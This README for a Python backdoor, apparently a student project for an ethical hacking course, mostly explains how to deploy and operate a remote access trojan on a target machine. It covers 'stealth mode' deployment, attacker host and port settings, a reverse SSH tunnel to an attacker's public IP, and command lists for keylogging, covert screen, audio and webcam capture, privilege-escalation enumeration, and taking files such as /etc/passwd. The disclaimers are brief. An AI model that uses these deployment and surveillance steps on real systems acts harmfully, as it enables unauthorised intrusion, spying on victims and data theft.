# Python Backdoor - DES484 Assignment

**⚠️ EDUCATIONAL PURPOSE ONLY - ETHICAL HACKING CLASS PROJECT**

This is a reverse shell backdoor created for the DES484 Ethical Hacking course at SIIT. This project demonstrates advanced post-exploitation techniques and backdoor development concepts.

## 📋 Project Structure

```
DES484_Backdoor/
├── backdoor.py                  # Backdoor client (deploys on target machine)
├── server.py                    # Attacker controller (runs on attacker machine)
├── requirements.txt             # Python dependencies (optional)
├── IMPLEMENTATION_GUIDE.md      # Detailed setup and usage guide
├── README.md                    # This file
│
├── features/                    # Feature modules
│   ├── __init__.py
│   ├── keylogger.py            # Keystroke logging with auto-download
│   ├── privilege_escalation.py # Privilege escalation techniques
│   ├── screen_audio_capture.py # Screen, audio, webcam, and screen recording
│   └── network_discovery.py    # Network reconnaissance
│
├── utils/                       # Utility modules
│   ├── __init__.py
│   └── configure.py            # Configuration helpers
│
├── exploitation/                # Exploitation and payload building
│   ├── build_executable.py     # Build standalone executables
│   ├── EXECUTABLE_GUIDE.md     # Guide for creating executables
│   ├── SUMMARY.md              # Exploitation summary
│   ├── icons/                  # Icons for executables
│   │   └── README.md
│   └── payloads/               # Payload templates
│       └── README.md
│
└── logs/                        # Logs directory (auto-created)
    ├── keylog/                 # Keystroke logs
    │   └── keylog.txt          # Main keylog file
    ├── screenshots/            # Captured screenshots
    ├── audio/                  # Audio recordings
    ├── webcam/                 # Webcam captures
    └── recordings/             # Screen recordings
        └── README.md           # Recording guide
```

### 📥 Downloaded Files (on Attacker Machine)

When using the backdoor, certain commands automatically download files to your attacker machine:

```
Attacker_Machine/
├── keylog_dump_YYYYMMDD_HHMMSS.txt  # Downloaded keylog files
├── server.py                         # Your controller
└── (downloaded screenshots, recordings, etc.)
```

## 🎯 Features Implemented

### 1. **Keylogger** ⌨️

- Real-time keystroke capture
- Logs keystrokes to file with timestamps
- **Auto-download feature**: `keylog_dump` automatically downloads log file to attacker machine
- Works with or without external libraries (fallback mode)
- Downloaded as: `keylog_dump_YYYYMMDD_HHMMSS.txt`
- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`, `keylog_status`

### 2. **Privilege Escalation** 🔐

- Check current privilege level
- Enumerate SUID binaries (Linux/macOS)
- Find sudo opportunities
- Discover writable system paths
- List running services
- Check scheduled tasks
- Find sensitive files
- Commands: `priv_check`, `priv_enum`, `priv_services`, `priv_tasks`, `priv_sensitive`

### 3. **Screen & Media Capture** 📸

- **Screenshot capture**: Single or multiple screenshots
- **Audio recording**: Record from microphone
- **Webcam capture**: Capture images from webcam
- **Screen recording** (NEW): Record screen video with configurable FPS
  - Timed recording: `record_screen <duration> <fps>`
  - Background recording: `record_start`, `record_stop`
  - Multiple recording methods (OpenCV, MSS, ffmpeg)
- Multiple fallback methods for compatibility
- Commands: `screenshot`, `screenshot_multi`, `audio_record`, `webcam_snap`, `record_screen`, `record_start`, `record_stop`, `record_list`

### 4. **Network Discovery** 🌐

- Network interface enumeration
- Local network scanning (ping sweep)
- Port scanning on remote hosts
- Active connection monitoring
- ARP cache inspection
- Public IP detection
- Internet connectivity check
- Commands: `net_info`, `net_scan`, `net_portscan`, `net_connections`, `net_public_ip`, `net_check_internet`

### 5. **File Operations** �

- Download files from target to attacker
- Upload files from attacker to target
- Directory navigation
- Commands: `download <file>`, `upload <file>`, `cd <dir>`

## 🚀 Installation & Setup

### Prerequisites

- Python 3.6 or higher
- Network connectivity between attacker and target machines

### For Attacker Machine (Controller)

1. **Clone or download the project:**

   ```bash
   cd ~/Desktop
   git clone <repository> DES484_Backdoor
   cd DES484_Backdoor
   ```

2. **Install required libraries (recommended):**

   ```bash
   pip3 install -r requirements.txt
   ```

   This installs:

   - `pynput` - Keylogger functionality
   - `Pillow` - Screenshot capture
   - `pyautogui` - Screen automation
   - `pyaudio` - Audio recording
   - `opencv-python` - Webcam and screen recording
   - `numpy` - Screen recording support
   - `mss` - Fast screen capture
   - `imageio` - Video file creation
   - `imageio-ffmpeg` - FFmpeg codec support

   **Note:** The controller script (`server.py`) uses only standard Python libraries. Install these dependencies for full feature support on target machines.

3. **Find your IP address:**

   ```bash
   # Linux/macOS
   ifconfig | grep "inet "
   # or
   ip addr show

   # Windows
   ipconfig
   ```

4. **Start the listener:**
   ```bash
   python3 server.py
   # Or specify custom port:
   python3 server.py 5555
   ```

### For Target Machine (Backdoor Client)

#### Method 1: Full Installation (Recommended for testing)

1. **Copy the entire project to target:**

   ```bash
   scp -r DES484_Backdoor user@target:/tmp/
   ```

2. **Install optional dependencies:**

   ```bash
   cd /tmp/DES484_Backdoor
   pip install -r requirements.txt
   ```

3. **Configure the backdoor:**
   Edit `backdoor.py` and change the connection settings:

   ```python
   ATTACKER_HOST = '192.168.1.12'  # Your attacker IP
   ATTACKER_PORT = 5556            # Your listener port
   ```

4. **Run the backdoor:**
   ```bash
   python3 backdoor.py
   ```

#### Method 2: Minimal Deployment (Stealth Mode)

**For environments without external libraries:**

1. **Copy only necessary files:**

   ```bash
   # Copy backdoor.py and features/ directory
   scp -r backdoor.py features/ user@target:/tmp/backdoor/
   ```

2. **Run without dependencies:**

   ```bash
   cd /tmp/backdoor
   python3 backdoor.py
   ```

   The backdoor will use fallback methods (system commands) for all features.

#### Method 3: Single-File Deployment (Advanced)

**For minimal footprint**, you can embed the features into `backdoor.py` or use only basic features:

```bash
# Edit backdoor.py to disable features if imports fail
python3 backdoor.py
```

## 📖 Usage Guide

### Starting the Attack

1. **Start the controller on attacker machine:**

   ```bash
   python3 server.py
   ```

   Output:

   ```
   [+] Listening on 0.0.0.0:5556
   [*] Waiting for incoming connections...
   ```

2. **Deploy and run backdoor on target:**

   ```bash
   python3 backdoor.py
   ```

3. **Connection established:**
   ```
   [+] Connection established from 192.168.1.50:54321
   === System Information ===
   Hostname: target-machine
   System: Darwin
   ...
   ```

### Basic Commands

```bash
# Get help
help
help_advanced
quick

# System information
sysinfo

# Execute shell commands
ls -la
whoami
cat /etc/passwd

# File operations
download /etc/passwd
upload malware.exe
cd /tmp

# Exit
quit
```

### Advanced Features

#### Keylogger

```bash
# Start capturing keystrokes
keylog_start

# Download captured keystrokes (auto-downloads to attacker machine)
keylog_dump
# File saved as: keylog_dump_YYYYMMDD_HHMMSS.txt

# Check keylogger status
keylog_status

# Stop keylogger
keylog_stop

# Clear logs on target
keylog_clear
```

#### Privilege Escalation

```bash
# Check current privileges
priv_check

# Enumerate escalation vectors
priv_enum

# List services (potential vulnerabilities)
priv_services

# Find scheduled tasks
priv_tasks

# Search for sensitive files
priv_sensitive
```

#### Screen Capture

```bash
# Take single screenshot
screenshot

# Take multiple screenshots (5 shots, 2 seconds apart)
screenshot_multi 5 2

# List captured screenshots
screenshot_list

# Download screenshot
download logs/screenshots/screenshot_20241002_143022.png
```

#### Screen Recording

```bash
# Record screen for 10 seconds at 15 fps (default)
record_screen

# Record for 30 seconds at 30 fps (high quality)
record_screen 30 30

# Start background recording (max 1 hour)
record_start

# Check recording status
record_status

# Stop background recording
record_stop

# List all recordings
record_list

# Download recording
download logs/recordings/screen_recording_20241004_143022.mp4
```

#### Audio & Webcam

```bash
# Record audio for 10 seconds
audio_record 10

# List recordings
audio_list

# Capture webcam image
webcam_snap

# Download recordings
download logs/audio/audio_20241002_143530.wav
```

#### Network Discovery

```bash
# Get network information
net_info

# Scan local network for hosts
net_scan

# Show active connections
net_connections

# Scan ports on specific host
net_portscan 192.168.1.1

# Get public IP
net_public_ip

# Check internet connectivity
net_check_internet
```

## 🔧 Troubleshooting

### Connection Issues

**Problem:** Target can't connect to attacker

```bash
# On attacker machine, check firewall:
sudo ufw allow 5556/tcp          # Linux
sudo firewall-cmd --add-port=5556/tcp  # CentOS/RHEL

# Verify listener is running:
netstat -an | grep 5556
```

**Problem:** Wrong IP address

```bash
# Find correct IP:
ip addr show                      # Linux
ifconfig                          # macOS
ipconfig                          # Windows
```

### Feature Not Working

**Problem:** "Feature not available"

```bash
# Check if feature modules exist:
ls features/

# Install dependencies:
pip install -r requirements.txt

# Or use fallback mode (features use system commands)
```

**Problem:** Import errors

```bash
# The backdoor is designed to work without external libraries
# Features automatically use fallback methods

# To use full features, install:
pip install pynput Pillow pyautogui pyaudio opencv-python numpy mss imageio imageio-ffmpeg

# For screen recording, also install ffmpeg (recommended):
# macOS:   brew install ffmpeg
# Ubuntu:  sudo apt-get install ffmpeg
# Windows: Download from ffmpeg.org
```

### Permission Issues

**Problem:** Permission denied

```bash
# Run with appropriate permissions:
sudo python3 backdoor.py          # For privileged operations

# Or use privilege escalation features:
priv_enum                         # Find escalation vectors
```

## 🌐 Network Configuration

### Same Network (LAN)

```python
# In backdoor.py:
ATTACKER_HOST = '192.168.0.107'   # Attacker's local IP
ATTACKER_PORT = 5556
```

### Different Networks (WAN/Internet)

**Method 1: Port Forwarding**

```bash
# On attacker's router:
# Forward external_port -> attacker_ip:5556

# In backdoor.py:
ATTACKER_HOST = 'attacker_public_ip'
ATTACKER_PORT = external_port
```

**Method 2: Reverse SSH Tunnel**

```bash
# On target:
ssh -R 5556:localhost:5556 user@attacker_public_ip

# In backdoor.py:
ATTACKER_HOST = 'localhost'
ATTACKER_PORT = 5556
```

**Method 3: VPN**

```bash
# Use VPN to create virtual LAN
# Both machines connect to same VPN
# Use VPN IP addresses
```

## 📚 Documentation

This project includes comprehensive documentation:

- **README.md** (this file) - Quick start and overview
- **IMPLEMENTATION_GUIDE.md** - Detailed setup, testing, and feature guides
- **exploitation/** - Guides for building executables and payloads
  - **EXECUTABLE_GUIDE.md** - How to create standalone executables
  - **SUMMARY.md** - Exploitation techniques summary

### Additional Resources

For detailed information about specific features, see:

- Keylogger auto-download feature
- Screen recording capabilities
- Network discovery techniques
- Privilege escalation methods

All features are documented in `IMPLEMENTATION_GUIDE.md`.

## ⚖️ Ethical Guidelines

**IMPORTANT:** This tool is for **AUTHORIZED TESTING ONLY**

### Legal Usage

✅ Your own systems
✅ Lab environments with permission
✅ Authorized penetration testing engagements
✅ Educational research with consent

### Illegal Usage

❌ Unauthorized access to systems
❌ Malicious purposes
❌ Violating privacy laws
❌ Without written authorization

**Disclaimer:** The authors are not responsible for misuse of this tool. Users must comply with all applicable laws and ethical guidelines.

## 🚀 Quick Reference

### Essential Commands

| Category        | Command                | Description                |
| --------------- | ---------------------- | -------------------------- |
| **Help**        | `help`                 | Show basic commands        |
|                 | `help_advanced`        | Show all advanced features |
|                 | `quick`                | Quick reference guide      |
| **System**      | `sysinfo`              | Display system information |
|                 | `cd <dir>`             | Change directory           |
| **Files**       | `download <file>`      | Download file from target  |
|                 | `upload <file>`        | Upload file to target      |
| **Keylogger**   | `keylog_start`         | Start keystroke capture    |
|                 | `keylog_dump`          | Download keylog file       |
|                 | `keylog_stop`          | Stop keylogger             |
| **Screenshots** | `screenshot`           | Capture single screenshot  |
|                 | `screenshot_multi 5 2` | Multiple screenshots       |
| **Recording**   | `record_screen 30 15`  | Record screen (30s, 15fps) |
|                 | `record_start`         | Start background recording |
|                 | `record_stop`          | Stop recording             |
| **Network**     | `net_info`             | Network information        |
|                 | `net_scan`             | Scan local network         |
| **Privileges**  | `priv_check`           | Check current privileges   |
|                 | `priv_enum`            | Find escalation vectors    |
| **Exit**        | `quit`                 | Close connection           |

### File Locations

**On Target Machine:**

- Keylogs: `logs/keylog/keylog.txt`
- Screenshots: `logs/screenshots/`
- Recordings: `logs/recordings/`
- Audio: `logs/audio/`
- Webcam: `logs/webcam/`

**On Attacker Machine:**

- Downloaded keylogs: `keylog_dump_YYYYMMDD_HHMMSS.txt`
- Other downloads: Same directory as `server.py`
